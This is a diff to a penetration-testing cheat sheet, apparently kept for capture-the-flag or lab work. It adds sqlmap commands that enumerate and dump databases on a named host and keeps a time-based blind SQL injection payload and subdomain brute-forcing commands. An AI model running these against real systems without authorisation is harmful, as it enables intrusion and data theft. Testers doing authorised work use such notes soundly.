@@ -23,6 +23,7 @@ sketch
 sketchy
 9447 / 6841 / 6441
 robots.txt
+flag
 ```
 
 ---
@@ -57,8 +58,6 @@ nmap -vv OR -dd [ hostname/ip ]
 
 **Aquatone**
 ```
-ssh ec2-user@tehec2instanceidduh.aws.etc.etc        // get in
-cd /home/ec2-user/sec_tools/RECON/aquatone          // go to aquatone
 aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
 cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
 ```
@@ -98,7 +97,12 @@ company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
 
 **Sqlmap Commands**
 ```
+Enumerate everything:
+python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap
+-a --level=3
 
+Enumerate a specific database:
+python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
 ```
 
 
